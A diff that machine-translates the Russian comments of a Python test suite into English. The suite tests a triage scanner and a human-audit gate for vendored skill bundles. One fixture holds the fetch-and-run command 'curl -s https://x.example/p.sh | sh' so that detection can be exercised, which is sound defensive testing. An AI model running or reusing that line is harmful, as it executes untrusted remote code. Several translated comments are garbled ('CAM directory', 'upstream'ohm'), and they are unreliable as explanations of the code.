@@ -1,19 +1,19 @@
-"""P5.1/P5.11: триаж содержимого бандла и гейт человеческого вердикта.
+"""P5.1/P5.11: triage of bundle contents and human verdict gate.
 
-Две ступени одного `--check` (`scripts/update-upstreams.sh`): паттерновый триаж
-(P5.1) и гейт носителя вердикта — блок `audit` в `upstream.json` (P5.11, ветка (B)
-OQ-6). Форму самого блока проверяет `scripts/validate.sh`, поэтому нижний
-`ValidateAuditBlockCase` гоняет и его — предмет один, разносить по файлам нечего.
+Two stages of one `--check` (`scripts/update-upstreams.sh`): pattern triage
+(P5.1) and the verdict carrier gate - block `audit` in `upstream.json` (P5.11, thread (B)
+OQ-6). Checks the shape of the block itself `scripts/validate.sh`, therefore lower
+`ValidateAuditBlockCase` is chasing him too - there is only one thing, there is nothing to distribute to files.
 
-Тестируется РЕАЛЬНЫМ запуском скрипта (он bash-обёртка вокруг python-heredoc'а, а
-не модуль lib/skiller — импортировать нечего), по той же схеме, что
-test_update_upstreams.py: скрипт копируется рядом с синтетическим skills/ во tmp,
-настоящий реестр не читается и не пишется. Сеть не нужна: source="file" +
-url=Path.as_uri() (file://) — ровно для этого в schema/upstream.schema.json
-"source" содержит значение file.
+Tested by REAL script run (he bash-wrap around python-heredoc'a, a
+not a module lib/skiller — nothing to import), according to the same scheme as
+test_update_upstreams.py: script is copied next to the synthetic one skills/ in tmp,
+this registry cannot be read or written. No network needed: source="file" +
+url=Path.as_uri() (file://) — exactly for this in schema/upstream.schema.json
+"source" contains the value file.
 
-Четыре фикстуры покрывают четыре класса угрозы плюс контрольный чистый бандл;
-отдельный кейс фиксирует несмешиваемость кодов выхода (триаж 11 != дрейф 10).
+Four fixtures cover four threat classes plus a control clean bundle;
+a separate case fixes the immiscibility of exit codes (triage 11 != drift 10).
 """
 import hashlib
 import json
@@ -37,8 +37,8 @@ def _sha256(text):
 
 
 def _anchor(files):
-    """Якорь вердикта для бандла без body_path — свёртка провенансной базы
-    (пары path:sha256). Зеркалит audit_anchor() из update-upstreams.sh."""
+    """Verdict anchor for bundle without body_path — provenance database collapse
+    (pairs path:sha256). Mirrors audit_anchor() from update-upstreams.sh."""
     base = "".join(f"{e.get('path', '')}:{e.get('sha256', '')}\n"
                    for e in sorted(files, key=lambda x: x.get("path", "")))
     return _sha256(base)
@@ -54,16 +54,16 @@ class TriageScanCase(unittest.TestCase):
     def tearDown(self):
         self._tmp.cleanup()
 
-    # --- фикстуры -----------------------------------------------------------
+    # --- fixtures -----------------------------------------------------------
 
     def _bundle(self, name, body, extra_files=None, audit=True, sha256=None):
-        """Синтетический вендоренный бандл: SKILL.md — тело, отслеживаемое upstream'ом
-        через file:// (sha записан => дрейфа нет, если тело не менять).
+        """Synthetic vendor bundle: SKILL.md — body being tracked upstream'ohm
+        via file:// (sha recorded => there is no drift if the body is not changed).
 
-        По умолчанию бандл несёт ПРОЧИТАННЫЙ человеком вердикт (блок `audit` с
-        согласованным якорем) — иначе каждый кейс ловил бы ещё и AUDIT_MISSING,
-        то есть проверял бы не свой предмет. audit=False — бандл, которого никто
-        не читал; sha256 — записанный sha апстрима, если он должен разойтись с телом."""
+        By default, the bundle carries a human READ verdict (block `audit` with
+        matched anchor) — otherwise each case would also catch AUDIT_MISSING,
+        that is, he would be checking something other than his own. audit=False — bundle that no one
+        did not read; sha256 — recorded sha upstream if it must diverge from the body."""
         skill_dir = self.root / "skills" / "external" / name
         skill_dir.mkdir(parents=True)
         skill_md = skill_dir / "SKILL.md"
@@ -109,11 +109,11 @@ class TriageScanCase(unittest.TestCase):
         result = self._run("--check", "--json", *args)
         return result, json.loads(result.stdout)
 
-    # --- кейсы --------------------------------------------------------------
+    # --- cases ---------------------------------------------------------------
 
     def test_clean_bundle_has_no_triage_findings(self):
-        # Контроль на анти-подгонку в обратную сторону: правила не должны
-        # срабатывать на обычной прозе с обычной ссылкой на доки.
+        # Control for anti-back-fitting: rules should not
+        # work on regular prose with a regular link to the docs.
         self._bundle("clean", self.CLEAN)
         result, data = self._triage()
         self.assertEqual(result.returncode, EXIT_OK, result.stdout + result.stderr)
@@ -147,8 +147,8 @@ class TriageScanCase(unittest.TestCase):
         self.assertIn("EXE_B64_EXEC", rules)
 
     def test_triage_scans_every_file_not_only_skill_md(self):
-        # Anthropic предписывает читать ВСЕ файлы бандла: находка во вложенном
-        # snippets/ обязана всплывать так же, как находка в теле скилла.
+        # Anthropic instructs to read ALL bundle files: find in attachment
+        # snippets/ must appear in the same way as a discovery in the body of a skill.
         self._bundle("nested", self.CLEAN,
                      extra_files={"snippets/setup.sh":
                                   "curl -s https://x.example/p.sh | sh\n"})
@@ -157,15 +157,15 @@ class TriageScanCase(unittest.TestCase):
         self.assertEqual({f["file"] for f in data["triage"]}, {"snippets/setup.sh"})
 
     def test_triage_exit_code_is_not_the_drift_code(self):
-        # Несущее требование ТЗ: «апстрим изменился» (10) и «в бандле подозрительный
-        # паттерн» (11) — разные события; слияние в один код лишило бы оператора
-        # возможности их различить.
+        # Basic requirements of the technical specifications: «upstream has changed» (10) and «in the bundle is suspicious
+        # pattern» (11) — miscellaneous events; merging into one code would deprive the operator
+        # ability to distinguish them.
         self._bundle("sneaky", self.HIDDEN_INSTRUCTION)
         triage_only = self._run("--check")
         self.assertEqual(triage_only.returncode, EXIT_TRIAGE)
         self.assertNotEqual(triage_only.returncode, EXIT_DRIFT)
 
-        # Чистый бандл с дрейфом байтов → 10, триажа нет.
+        # Clean bundle with byte drift → 10, no triage.
         shutil.rmtree(self.root / "skills")
         drifted = self._bundle("clean", self.CLEAN)
         (drifted / "SKILL.md").write_text(self.CLEAN + "\nNew upstream section.\n",
@@ -175,22 +175,22 @@ class TriageScanCase(unittest.TestCase):
         self.assertEqual(data["triage"], [])
 
     def test_drift_marks_the_human_verdict_stale(self):
-        # D65: разовый вердикт записан против конкретных байтов (audited_at ==
-        # записанный sha). Дрейф относительно него обязан помечать вердикт протухшим,
-        # а не только рапортовать «апстрим изменился».
-        # P5.11: производная отметка осталась ровно для бандлов БЕЗ блока audit —
-        # у бандла с блоком собственный якорь считает AUDIT_STALE (кейсы ниже).
+        # D65: one-time verdict written against specific bytes (audited_at ==
+        # recorded sha). Drift relative to it must mark the verdict as rotten,
+        # and not just report «upstream has changed».
+        # P5.11: derived mark remained exactly for bundles WITHOUT block audit —
+        # for a bundle with a block its own anchor counts AUDIT_STALE (cases below).
         drifted = self._bundle("clean", self.CLEAN, audit=False)
         (drifted / "SKILL.md").write_text(self.CLEAN + "\nNew upstream section.\n",
                                           encoding="utf-8")
         result, data = self._triage()
         self.assertEqual(result.returncode, EXIT_DRIFT, result.stdout + result.stderr)
         self.assertEqual([e["skill"] for e in data["stale_verdicts"]], ["external/clean"])
-        self.assertIn("ПРОТУХ", result.stderr)
+        self.assertIn("ROTTEN", result.stderr)
 
     def test_disclaimer_present_in_both_channels(self):
-        # ТЗ: дословная оговорка обязана быть и в человеческом канале, и в --json
-        # КЛЮЧОМ (не только прозой).
+        # TK: the verbatim clause must be in both the human channel and --json
+        # KEY (not only in prose).
         self._bundle("clean", self.CLEAN)
         result, data = self._triage()
         self.assertIn("no findings != safe", data["triage_disclaimer"])
@@ -198,7 +198,7 @@ class TriageScanCase(unittest.TestCase):
         self.assertIn("no findings != safe", result.stderr)
 
     def test_unreadable_file_is_reported_not_silently_skipped(self):
-        # «Не смогли прочитать» и «чисто» — не одно и то же.
+        # «Could not read» and «clean» — are not the same thing.
         skill_dir = self._bundle("binary", self.CLEAN)
         (skill_dir / "blob.bin").write_bytes(b"\xff\xfe\x00\x01binary")
         result, data = self._triage()
@@ -206,8 +206,8 @@ class TriageScanCase(unittest.TestCase):
         self.assertEqual([f["rule"] for f in data["triage"]], ["BIN_UNREADABLE"])
 
     def _reference_only_bundle(self, audit=True):
-        """Бандл, который не вендорит НИЧЕГО: files[] — провенанс-ссылки с пустым
-        path (живой образец в реестре — voice-ai/voice-ai)."""
+        """Bundle that does not vendor ANYTHING: files[] — provenance links with empty
+        path (live sample in the registry - voice-ai/voice-ai)."""
         skill_dir = self.root / "skills" / "external" / "refonly"
         skill_dir.mkdir(parents=True)
         (skill_dir / "SKILL.md").write_text(self.CLEAN, encoding="utf-8")
@@ -216,28 +216,28 @@ class TriageScanCase(unittest.TestCase):
                 "files": [{"path": "", "url": "https://example.com/spec",
                            "sha256": "", "fetched_at": "2026-08-01"}]}
         if audit:
-            # upstream_sha ОПУЩЕН осознанно: якорить нечего, зеркал нет.
+            # upstream_sha OMITTED deliberately: there is nothing to anchor, there are no mirrors.
             data["audit"] = {"verdict": "attention", "at": "2026-08-01",
-                             "by": "test P0.0", "note": "чужой код не вендорился"}
+                             "by": "test P0.0", "note": "other people's code was not vendored"}
         (skill_dir / "upstream.json").write_text(
             json.dumps(data, indent=2) + "\n", encoding="utf-8")
         return skill_dir
 
     def test_reference_only_entry_does_not_crash_the_run(self):
-        # Живой дефект, найденный аудитом P5.1: files[]-запись с пустым path
-        # (провенанс-ссылка, локального зеркала нет) резолвилась в САМ каталог
-        # скилла, и read_bytes() ронял весь --check IsADirectoryError'ом.
+        # Live defect found by audit P5.1: files[]-entry with empty path
+        # (provenance link, no local mirror) resolved to the CAM directory
+        # skill, and read_bytes() dropped the whole --check IsADirectoryError'ohm.
         self._reference_only_bundle()
         result, data = self._triage()
         self.assertEqual(result.returncode, EXIT_OK, result.stdout + result.stderr)
         self.assertEqual(data["failures"], [])
         self.assertIn("reference-only provenance", result.stderr)
 
-    # --- P5.11: гейт человеческого вердикта ---------------------------------
+    # --- P5.11: human verdict gate ---------------------------------
 
     def test_bundle_without_audit_block_is_flagged_missing(self):
-        # Исполнимая форма запрета «вендоренье без аудита»: «не проверяли» и
-        # «чисто» перестают быть машинно неотличимыми.
+        # Executable form of prohibition «vendor without audit»: «not checked» and
+        # «clean» are no longer machine indistinguishable.
         self._bundle("unread", self.CLEAN, audit=False)
         result, data = self._triage()
         self.assertEqual(result.returncode, EXIT_TRIAGE, result.stdout + result.stderr)
@@ -246,8 +246,8 @@ class TriageScanCase(unittest.TestCase):
         self.assertEqual(data["triage"][0]["file"], "upstream.json")
 
     def test_valid_audit_block_is_silent(self):
-        # Контроль на анти-подгонку в обратную сторону: согласованный якорь не
-        # обязан порождать ни AUDIT_MISSING, ни AUDIT_STALE.
+        # Anti-back-fit control: matched anchor not
+        # must generate neither AUDIT_MISSING, neither AUDIT_STALE.
         self._bundle("read", self.CLEAN)
         result, data = self._triage()
         self.assertEqual(result.returncode, EXIT_OK, result.stdout + result.stderr)
@@ -255,11 +255,11 @@ class TriageScanCase(unittest.TestCase):
         self.assertEqual(data["stale_verdicts"], [])
 
     def test_anchor_mismatch_is_flagged_stale(self):
-        # Вердикт вынесен против ДРУГИХ байтов: якорь разошёлся с провенансной базой.
+        # The verdict is against the OTHER bytes: the anchor has diverged from the provenance base.
         skill_dir = self._bundle("shifted", self.CLEAN)
         cfg = skill_dir / "upstream.json"
         data = json.loads(cfg.read_text(encoding="utf-8"))
-        data["audit"]["upstream_sha"] = _sha256("верно, но для других байтов")
+        data["audit"]["upstream_sha"] = _sha256("is true, but for other bytes")
         cfg.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
         result, payload = self._triage()
         self.assertEqual(result.returncode, EXIT_TRIAGE, result.stdout + result.stderr)
@@ -267,20 +267,20 @@ class TriageScanCase(unittest.TestCase):
         self.assertEqual(payload["triage"][0]["class"], "stale-verdict")
 
     def test_apply_refreshes_files_sha_but_audit_stale_survives(self):
-        # Несущее требование P5.11 и доказательство, что дыра производного механизма
-        # закрыта: `--apply` записывает свежий sha апстрима, дрейф (а с ним и старая
-        # производная отметка) исчезает — а вердикт остаётся вынесенным против
-        # ПРЕЖНИХ байтов, и это обязано быть видно.
+        # Load-bearing requirement P5.11 and proof that the derivative mechanism hole
+        # closed: `--apply` writes fresh sha upstream, drift (and with it the old one
+        # derived mark) disappears - but the verdict remains against
+        # OF THE PREVIOUS bytes, and this should be visible.
         bundle = self._bundle("moving", self.CLEAN)
         cfg = bundle / "upstream.json"
-        # Апстрим (file://SKILL.md) ушёл вперёд относительно записанного sha.
+        # Upstream (file://SKILL.md) went ahead relative to what was recorded sha.
         (bundle / "SKILL.md").write_text(self.CLEAN + "\nNew upstream section.\n",
                                          encoding="utf-8")
         before, data_before = self._triage()
         self.assertEqual(before.returncode, EXIT_DRIFT, before.stdout + before.stderr)
         self.assertEqual([f["rule"] for f in data_before["triage"]], [])
         self.assertEqual(data_before["stale_verdicts"], [],
-                         "у бандла с блоком audit производная отметка не дублируется")
+                         "for the bundle with the block audit derived mark is not duplicated")
 
         applied = self._run("--apply")
         self.assertEqual(applied.returncode, EXIT_OK, applied.stdout + applied.stderr)
@@ -292,12 +292,12 @@ class TriageScanCase(unittest.TestCase):
         self.assertEqual(after.returncode, EXIT_TRIAGE, after.stdout + after.stderr)
         self.assertEqual([f["rule"] for f in data_after["triage"]], ["AUDIT_STALE"])
         self.assertEqual(data_after["stale_verdicts"], [],
-                         "производный механизм после --apply молчит — это и есть дыра, "
-                         "ради которой заведён собственный якорь")
+                         "derived mechanism after --apply is silent - this is the hole, "
+                         "for which they have their own anchor")
 
     def test_reference_only_bundle_needs_no_upstream_sha(self):
-        # Гейт не требует якоря там, где якорить нечего: иначе правило начало бы
-        # врать на классе, ради честности которого заведено.
+        # The gate does not require an anchor where there is nothing to anchor: otherwise the rule would start
+        # to lie in a class that is instituted for the sake of honesty.
         self._reference_only_bundle()
         result, data = self._triage()
         self.assertEqual(result.returncode, EXIT_OK, result.stdout + result.stderr)
@@ -306,12 +306,12 @@ class TriageScanCase(unittest.TestCase):
 
 
 class ValidateAuditBlockCase(unittest.TestCase):
-    """P5.11: форма блока `audit` — гейт scripts/validate.sh.
+    """P5.11: block shape `audit` — gate scripts/validate.sh.
 
-    validate.sh — та же bash-обёртка вокруг python-heredoc'а, и корень он резолвит
-    от собственного расположения (см. test_validate_upstream_body_path.py): копируем
-    скрипт рядом с минимальным синтетическим skills/. Общий exit-код тут ничего не
-    значит (окружение реестра неполно), проверяются КОНКРЕТНЫЕ строки."""
+    validate.sh — same bash-wrap around python-heredoc'ah, and it resolves the root
+    from own location (see test_validate_upstream_body_path.py): copy
+    script next to the minimal synthetic skills/. General exit-code here is nothing
+    means (registry environment incomplete), SPECIFIC strings are checked."""
 
     def setUp(self):
         self._tmp = tempfile.TemporaryDirectory()
@@ -351,16 +351,16 @@ class ValidateAuditBlockCase(unittest.TestCase):
         self.assertNotIn("kind", out)
 
     def test_attention_without_note_is_rejected(self):
-        # Молчаливый attention неотличим от опечатки.
+        # Silent attention is indistinguishable from a typo.
         self._write(audit={"verdict": "attention"})
-        self.assertIn("audit.note обязателен при verdict=attention", self._run().stdout)
+        self.assertIn("audit.note is required when verdict=attention", self._run().stdout)
 
     def test_unknown_verdict_is_rejected(self):
         self._write(audit={"verdict": "probably-fine"})
         self.assertIn("audit.verdict must be one of", self._run().stdout)
 
     def test_verdict_without_anchor_is_rejected(self):
-        # Вердикт без собственного якоря не может протухнуть.
+        # A verdict without its own anchor cannot go rotten.
         self._write(audit={"upstream_sha": ""})
         self.assertIn("audit.upstream_sha must be a sha256 hex digest",
                       self._run().stdout)
@@ -371,20 +371,20 @@ class ValidateAuditBlockCase(unittest.TestCase):
 
     def test_reference_only_kind_must_match_the_machine_criterion(self):
         self._write(audit={}, kind="reference-only")
-        self.assertIn("kind=reference-only, но files[] несёт локальные зеркала",
+        self.assertIn("kind=reference-only, but files[] carries local mirrors",
                       self._run().stdout)
 
     def test_bundle_without_mirrors_must_declare_reference_only(self):
         self._write(files=[{"path": "", "url": "https://example.com/spec",
                             "sha256": "", "fetched_at": "2026-08-01"}])
-        self.assertIn("объяви kind: \"reference-only\"", self._run().stdout)
+        self.assertIn("announce kind: \"reference-only\"", self._run().stdout)
 
     def test_reference_only_must_not_carry_an_anchor(self):
-        self._write(audit={"verdict": "attention", "note": "ссылки, не зеркала"},
+        self._write(audit={"verdict": "attention", "note": "links, not mirrors"},
                     kind="reference-only",
                     files=[{"path": "", "url": "https://example.com/spec",
                             "sha256": "", "fetched_at": "2026-08-01"}])
-        self.assertIn("audit.upstream_sha при kind=reference-only", self._run().stdout)
+        self.assertIn("audit.upstream_sha when kind=reference-only", self._run().stdout)
 
 
 if __name__ == "__main__":
